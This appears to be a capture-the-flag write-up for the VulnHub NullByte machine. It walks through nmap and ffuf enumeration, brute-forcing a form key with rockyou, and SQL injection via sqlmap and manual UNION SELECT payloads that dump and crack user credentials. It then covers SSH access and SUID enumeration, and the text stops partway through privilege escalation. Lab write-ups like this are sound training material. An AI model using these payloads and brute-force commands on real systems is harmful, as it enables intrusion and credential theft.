+Aggressive OS guesses: Linux 3.2 - 4.9 (96%), Sony Bravia smart TV (Android) (93%), Linux 3.10 - 4.11 (93%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (93%), Sony Android TV (Android 5.0) (92%), Android 5.1 (92%), Linux 3.2 - 3.16 (92%), Linux 3.12 (92%), Android 4.0 (92%), Linux 3.13 (91%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.92%E=4%D=2/3%OT=80%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=61FBAD05%P=x86_64-pc-linux-gnu)
+SEQ(SP=104%GCD=2%ISR=10C%TI=Z%CI=I%II=I%TS=8)
+OPS(O1=M5B4ST11NW6%O2=M5B4ST11NW6%O3=M5B4NNT11NW6%O4=M5B4ST11NW6%O5=M5B4ST11NW6%O6=M5B4ST11)
+WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
+ECN(R=N)
+ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW6%CC=Y%Q=)
+T1(R=N)
+T1(R=Y%DF=Y%TG=40%S=O%A=O%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=N)
+T4(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=N)
+T6(R=Y%DF=Y%TG=40%W=0%S=O%A=Z%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=N)
+IE(R=Y%DFI=N%TG=40%CD=S)
+
+Uptime guess: 0.004 days (since Thu Feb  3 18:16:37 2022)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.31 ms 192.168.110.11
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Feb  3 18:23:01 2022 -- 1 IP address (1 host up) scanned in 38.04 seconds
+
+</pre></table></code></div></div><h2 id="tcp80-http">TCP/80 (HTTP) <a href="#tcp80-http" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><h3 id="ffuf">FFUF <a href="#ffuf" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>┌──(root💀kali)-[~/vulnHub/NullByte]
+└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php' -fc 403
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.110.11/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .html .txt .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 403
+________________________________________________
+
+                        [Status: 200, Size: 196, Words: 20, Lines: 11]
+index.html              [Status: 200, Size: 196, Words: 20, Lines: 11]
+index.html              [Status: 200, Size: 196, Words: 20, Lines: 11]
+javascript              [Status: 301, Size: 321, Words: 20, Lines: 10]
+phpmyadmin              [Status: 301, Size: 321, Words: 20, Lines: 10]
+uploads                 [Status: 301, Size: 318, Words: 20, Lines: 10]
+:: Progress: [18460/18460] :: Job [1/1] :: 1983 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">phpmyadmin</code><li><code class="language-plaintext highlighter-rouge">uploads</code></ul><h1 id="initial-foothold">Initial Foothold</h1><h2 id="tcp80-http---image-forensics--http-form-bruteforce">TCP/80 (HTTP) - Image Forensics + HTTP Form Bruteforce <a href="#tcp80-http---image-forensics--http-form-bruteforce" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>View enumerated directories<ul><li><code class="language-plaintext highlighter-rouge">index.html</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220203190733.png" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">phpmyadmin</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220203190754.png" alt="" data-proofer-ignore><li><code class="language-plaintext highlighter-rouge">uploads</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220203190824.png" alt="" data-proofer-ignore></ul><li>Enumerate <code class="language-plaintext highlighter-rouge">uploads</code><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/NullByte]
+ └─# ffuf -u http://192.168.110.11/uploads/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.php,.txt' -fc 403
+
+         /'___\  /'___\           /'___\       
+        /\ \__/ /\ \__/  __  __  /\ \__/       
+        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+          \ \_\   \ \_\  \ \____/  \ \_\       
+           \/_/    \/_/   \/___/    \/_/       
+
+        v1.3.1 Kali Exclusive &lt;3
+ ________________________________________________
+
+  :: Method           : GET
+  :: URL              : http://192.168.110.11/uploads/FUZZ
+  :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+  :: Extensions       : .html .php .txt 
+  :: Follow redirects : false
+  :: Calibration      : false
+  :: Timeout          : 10
+  :: Threads          : 40
+  :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+  :: Filter           : Response status: 403
+ ________________________________________________
+ index.html              [Status: 200, Size: 113, Words: 6, Lines: 7]
+ :: Progress: [18460/18460] :: Job [1/1] :: 215 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</pre></table></code></div></div><li>Tried some default creds on <code class="language-plaintext highlighter-rouge">phpmyadmin</code>, failed<li>Only clue we have is the image, download the image<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/loot/http]
+ └─# wget -q http://192.168.110.11/main.gif
+</pre></table></code></div></div><li>Detect any hidden text/files<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/loot/http]
+ └─# exiftool main.gif | grep -i comment
+ Comment                         : P-): kzMb5nVYJw
+</pre></table></code></div></div><ul><li><code class="language-plaintext highlighter-rouge">kzMb5nVYJw</code></ul><li>Proceed to <code class="language-plaintext highlighter-rouge">/kzMb5nVYJw</code> <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220203204615.png" alt="" data-proofer-ignore><ul><li>“password ain’t that complex”</ul><li>Bruteforce<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/NullByte]
+ └─# ffuf -d "key=FUZZ" -u http://192.168.110.11/kzMb5nVYJw/index.php -H "Content-Type: application/x-www-form-urlencoded" -w /usr/share/wordlists/rockyou.txt -fw 19
+
+         /'___\  /'___\           /'___\       
+        /\ \__/ /\ \__/  __  __  /\ \__/       
+        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+          \ \_\   \ \_\  \ \____/  \ \_\       
+           \/_/    \/_/   \/___/    \/_/       
+
+        v1.3.1 Kali Exclusive &lt;3
+ ________________________________________________
+
+  :: Method           : POST
+  :: URL              : http://192.168.110.11/kzMb5nVYJw/index.php
+  :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
+  :: Header           : Content-Type: application/x-www-form-urlencoded
+  :: Data             : key=FUZZ
+  :: Follow redirects : false
+  :: Calibration      : false
+  :: Timeout          : 10
+  :: Threads          : 40
+  :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+  :: Filter           : Response words: 19
+ ________________________________________________
+
+ elite                   [Status: 200, Size: 145, Words: 9, Lines: 7]
+</pre></table></code></div></div><li>Submit form w/ elite <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220203205259.png" alt="" data-proofer-ignore></ol><h2 id="tcp80-http---sqli-database-enum-w-sqlmap">TCP/80 (HTTP) - SQLi Database Enum w/ SQLMap <a href="#tcp80-http---sqli-database-enum-w-sqlmap" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Check if it is susceptible to SQLi<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/NullByte]
+ └─# ffuf -u http://192.168.110.11/kzMb5nVYJw/420search.php?usrtosearch=FUZZ -w /usr/share/wordlists/sqli/vulnCheck.txt -fw 3
+
+         /'___\  /'___\           /'___\       
+        /\ \__/ /\ \__/  __  __  /\ \__/       
+        \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+         \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+          \ \_\   \ \_\  \ \____/  \ \_\       
+           \/_/    \/_/   \/___/    \/_/       
+
+        v1.3.1 Kali Exclusive &lt;3
+ ________________________________________________
+
+  :: Method           : GET
+  :: URL              : http://192.168.110.11/kzMb5nVYJw/420search.php?usrtosearch=FUZZ
+  :: Wordlist         : FUZZ: /usr/share/wordlists/sqli/vulnCheck.txt
+  :: Follow redirects : false
+  :: Calibration      : false
+  :: Timeout          : 10
+  :: Threads          : 40
+  :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+  :: Filter           : Response words: 3
+ ________________________________________________
+
+ " OR 1 = 1 -- -         [Status: 200, Size: 168, Words: 33, Lines: 1]
+ " OR "" = "             [Status: 200, Size: 168, Words: 33, Lines: 1]
+ "                       [Status: 200, Size: 168, Words: 33, Lines: 1]
+ #                             [Status: 200, Size: 224, Words: 33, Lines: 2]
+ :: Progress: [42/42] :: Job [1/1] :: 54 req/sec :: Duration: [0:00:03] :: Errors: 3 ::
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220203210327.png" alt="" data-proofer-ignore></p><li>Enumerate the database w/ SQLMAP<ol><li>Enumerate database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/exploit]
+ └─# sqlmap -r sqli.txt -p usrtosearch --dbs --output-dir=$(pwd)/sqlmap
+
+		
+ Parameter: usrtosearch (GET)
+ Type: boolean-based blind
+ Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+ Payload: usrtosearch=" AND 5195=5195#
+
+ Type: error-based
+ Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+ Payload: usrtosearch=" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176786a71,(SELECT (ELT(4502=4502,1))),0x7178767671,0x78))s), 8446744073709551610, 8446744073709551610)))-- RmAL
+
+ Type: time-based blind
+ Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+ Payload: usrtosearch=" AND (SELECT 9975 FROM (SELECT(SLEEP(5)))HjUW)-- Hkvj
+
+ Type: UNION query
+ Title: MySQL UNION query (NULL) - 3 columns
+ Payload: usrtosearch=" UNION ALL SELECT CONCAT(0x7176786a71,0x6558556579436b4c6b736a645474705970505259756c734c58416f6261784e69665458716864597a,0x7178767671),NULL,NULL#
+
+ available databases [5]:
+ [*] information_schema
+ [*] mysql
+ [*] performance_schema
+ [*] phpmyadmin
+ [*] seth
+</pre></table></code></div></div><li>Enumerate tables <code class="language-plaintext highlighter-rouge">seth</code> database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/exploit]
+ └─# sqlmap -r sqli.txt -p usrtosearch -D seth --tables --output-dir=$(pwd)/sqlmap
+
+ Parameter: usrtosearch (GET)
+ Type: boolean-based blind
+ Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+ Payload: usrtosearch=" AND 5195=5195#
+
+ Type: error-based
+ Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+ Payload: usrtosearch=" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176786a71,(SELECT (ELT(4502=4502,1))),0x7178767671,0x78))s), 8446744073709551610, 8446744073709551610)))-- RmAL
+
+ Type: time-based blind
+ Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+ Payload: usrtosearch=" AND (SELECT 9975 FROM (SELECT(SLEEP(5)))HjUW)-- Hkvj
+
+ Type: UNION query
+ Title: MySQL UNION query (NULL) - 3 columns
+ Payload: usrtosearch=" UNION ALL SELECT CONCAT(0x7176786a71,0x6558556579436b4c6b736a645474705970505259756c734c58416f6261784e69665458716864597a,0x7178767671),NULL,NULL#
+
+ Database: seth
+ [1 table]
+ +-------+
+ | users |
+ +-------+
+</pre></table></code></div></div><li>Dump <code class="language-plaintext highlighter-rouge">users</code> table<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+</pre><td class="rouge-code"><pre> ┌──(root💀kali)-[~/vulnHub/NullByte/192.168.110.11/exploit]
+ └─# sqlmap -r sqli.txt -p usrtosearch -D seth -T users --dump --output-dir=$(pwd)/sqlmap 
+
+
+ Parameter: usrtosearch (GET)
+ Type: boolean-based blind
+ Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)
+ Payload: usrtosearch=" AND 5195=5195#
+
+ Type: error-based
+ Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
+ Payload: usrtosearch=" AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7176786a71,(SELECT (ELT(4502=4502,1))),0x7178767671,0x78))s), 8446744073709551610, 8446744073709551610)))-- RmAL
+
+ Type: time-based blind
+ Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+ Payload: usrtosearch=" AND (SELECT 9975 FROM (SELECT(SLEEP(5)))HjUW)-- Hkvj
+
+ Type: UNION query
+ Title: MySQL UNION query (NULL) - 3 columns
+ Payload: usrtosearch=" UNION ALL SELECT CONCAT(0x7176786a71,0x6558556579436b4c6b736a645474705970505259756c734c58416f6261784e69665458716864597a,0x7178767671),NULL,NULL#
+
+ Database: seth
+ Table: users
+ [2 entries]
+ +----+---------------------------------------------+--------+------------+
+ | id | pass                                        | user   | position   |
+ +----+---------------------------------------------+--------+------------+
+ | 1  | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE | ramses | &lt;blank&gt;    |
+ | 2  | --not allowed--                             | isis   | employee   |
+ +----+---------------------------------------------+--------+------------+
+</pre></table></code></div></div></ol><li>Pass is base64 encoded &amp; hashed w/ md5 <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220203213403.png" alt="" data-proofer-ignore><ul><li>ramses:omega</ul></ol><h2 id="tcp80-http---sqli-database-enum-manual">TCP/80 (HTTP) - SQLi Database Enum Manual <a href="#tcp80-http---sqli-database-enum-manual" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Check if it is susceptible to SQLi <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220204002009.png" alt="" data-proofer-ignore><li>Determine SQL query code <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220204001550.png" alt="" data-proofer-ignore><li>Hypothesis<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre> SELECT id, name, position FROM users WHERE name LIKE "%&lt;input_field&gt;%"
+	
+ # Instead of ', " is used, thus " allows us to close the previous query and start another one (UNION SELECT)
+</pre></table></code></div></div><li>Determine the number of columns &amp; reflected columns in this table<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre> Plain Text:
+ "UNION SELECT 1,2,3-- -
+	
+ URL Encoded:
+ "UNION+SELECT+1,2,3--+- 
+	
+ # Usually either # or -- - would work, but for this, only -- - worked
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220204002513.png" alt="" data-proofer-ignore></p><li>Determine databases<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre> Plain Text:
+ "UNION SELECT group_concat(SCHEMA_NAME),2,3 FROM information_schema.schemata-- -
+	
+ URL Encoded:
+ "UNION+SELECT+group_concat(SCHEMA_NAME),2,3+FROM+information_schema.schemata--+-
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220204003336.png" alt="" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre> available databases [5]:
+ [*] information_schema
+ [*] mysql
+ [*] performance_schema
+ [*] phpmyadmin
+ [*] seth
+</pre></table></code></div></div><li>Determine tables in <code class="language-plaintext highlighter-rouge">seth</code> database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre> Plain Text:
+ "UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema='seth'-- -
+	
+ URL Encoded:
+ "UNION+SELECT+group_concat(table_name),2,3+FROM+information_schema.tables+WHERE+table_schema='seth'--+-
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220204003838.png" alt="" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre> Database: seth
+ [1 Table]
+ users
+</pre></table></code></div></div><li>Determine columns in <code class="language-plaintext highlighter-rouge">users</code> table from <code class="language-plaintext highlighter-rouge">seth</code> database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre> Plain Text:
+ "UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -
+	
+ URL Encoded:
+ "UNION+SELECT+group_concat(column_name),2,3+FROM+information_schema.columns+WHERE+table_name='users'--+-
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220204004239.png" alt="" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre> Database: seth
+ Table: users
+ [3 Columns]
+ id
+ user
+ pass
+ position
+</pre></table></code></div></div><li>Determine value of columns in <code class="language-plaintext highlighter-rouge">users</code> table from <code class="language-plaintext highlighter-rouge">seth</code> database<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre> Plain Text
+ "UNION SELECT group_concat(user,':',pass),2,3 FROM seth.users -- - 
+	
+ URL Encoded:
+ "UNION+SELECT+group_concat(user,':',pass),2,3+FROM+seth.users+--+- 
+</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220204004654.png" alt="" data-proofer-ignore></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre> Database: seth
+ Table: users
+ [Columns: user:pass]
+ ramses:YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
+ isis:--not allowed--
+</pre></table></code></div></div></ol><h2 id="tcp777-ssh">TCP/777 (SSH) <a href="#tcp777-ssh" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>SSH w/ ramses:omega <img data-src="https://raw.githubusercontent.com/yufongg/yufongg.github.io/main/_posts/Writeups/Vulnhub/Linux/NullByte 1/images/Pasted%20image%2020220203213517.png" alt="" data-proofer-ignore></ol><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="root---via-suid-binary-path-hijacking">Root - Via SUID Binary (Path Hijacking) <a href="#root---via-suid-binary-path-hijacking" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ol><li>Enumerate SUID Binaries<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre> ramses@NullByte:~$ find / -perm -4000 2&gt;/dev/null 
+ /usr/lib/openssh/ssh-keysign
+ /usr/lib/policykit-1/polkit-agent-helper-1
+ /usr/lib/eject/dmcrypt-get-device
+ /usr/lib/pt_chown
+ /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+ /usr/bin/procmail
+ /usr/bin/at
+ /usr/bin/chfn
+ /usr/bin/newgrp
+ /usr/bin/chsh
+ /usr/bin/gpasswd
+ /usr/bin/pkexec
+ /usr/bin/passwd
+ /usr/bin/sudo
+ /usr/sbin/exim4
+ /var/www/backup/procwatch &lt;- Suspicious
+</pre></table></code></div></div><li>Execute <code class="language-plaintext highlighter-rouge">/var/www/backup/procwatch</code>, to see what it does<div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre> ramses@NullByte:~$ /var/www/backup/procwatch
+   PID TTY          TIME CMD
+  3311 pts/0    00:00:00 procwatch
+  3312 pts/0    00:00:00 sh
+  3313 pts/0    00:00:00 ps
+ ramses@NullByte:~$ 
